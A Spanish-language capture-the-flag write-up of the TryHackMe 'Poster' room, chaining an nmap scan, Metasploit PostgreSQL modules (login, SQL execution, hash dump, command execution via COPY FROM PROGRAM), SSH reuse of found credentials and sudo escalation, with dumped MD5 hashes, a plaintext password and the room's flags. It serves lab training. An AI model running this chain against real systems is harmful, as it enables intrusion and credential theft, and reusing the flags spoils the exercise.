# Poster

## Escaneo de puertos

Ejecutamos un mapeo de los puertos de la máquina víctima con`nmap`para identificar los puertos abiertos que puedan ser explotados.

```
sudo nmap -sV -T4 -p- 10.10.127.180
```

Hay tres puertos abiertos: el 22 de SSH, el 80 de HTTPy el 5432 de postgresql.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image.png)

## Explotación de PostgreSQL

Usamos`msfconsole`para explotar una posible vulnerabilidad en la versión de postgresql existente.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-1.png)

Buscamos`postgresql`en los módulos.

```
search postgresql
```

Usamos el número 22.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-2.png)

Mostramos las opciones disponibles.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-3.png)

Asignamos la IP de la máquina víctima y lo ejecutamos.

```
set rhosts 10.10.127.180
```

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-4.png)

Una vez obtenido los credenciales, usamos el módulo para poder ejecuta comandos.

```
use auxiliary/admin/postgres/postgres_sql
```

Asignamos la contraseña`password`que obtuvimos anteriormente. Tenemos la versión exacta de PostgreSQL que es la 9.5.21.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-5.png)

Ahora, usamos el siguiente módulo para dumpear los hashes ya que tenemos acceso total a la base de datos.

```
use /auxiliary/scanner/postgres/postgres_hashdump
```

Obtenemos todos los hashes de los usuarios de la base de datos.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-6.png)

```
darkstart  md58842b99375db43e9fdf238753623a27d
poster     md578fb805c7412ae597b399844a54cce0a
postgres   md532e12f215ba27cb750c9e093ce4b5127
sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
ti         md57af9ac4c593e9e4f275576e13f935579
tryhackme  md503aab1165001c8f8ccae31a8824efddc
```

Usamos ahora el módulo para la ejecución de comandos arbitrarios. De esta forma abrimos una sesión.

```
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-7.png)

Mostramos el contenido de la carpeta del usuario y el del archivo`credencials.txt`.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-8.png)

## Acceso por SSH

Accedemos al servidor por ssh con las credenciales de`dark`.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-9.png)

Inspeccionamos el directorio de`/var/www/html`.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-10.png)

Encontramos la credenciales de`alison`.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-11.png)

## Escalada de privilegios

Entramos ahora con el usuario`alison`por ssh. La contraseña es`p4ssw0rdS3cur3!#`.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-12.png)

Comprobamos los permisos que tiene.

```
sudo -l
```

Vemos que tiene permisos para ejecutar cualquier comando en el sistema.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-13.png)

Nos ponemos como usuario root y obtenemos la flag de`root.txt`.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-14.png)

```
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```

También obtenemos la flag del user.

![](Hacking_Etico/TryHackMe_WriteUps/Poster/images/image-15.png)

```
THM{postgresql_fa1l_conf1gurat1on}
```


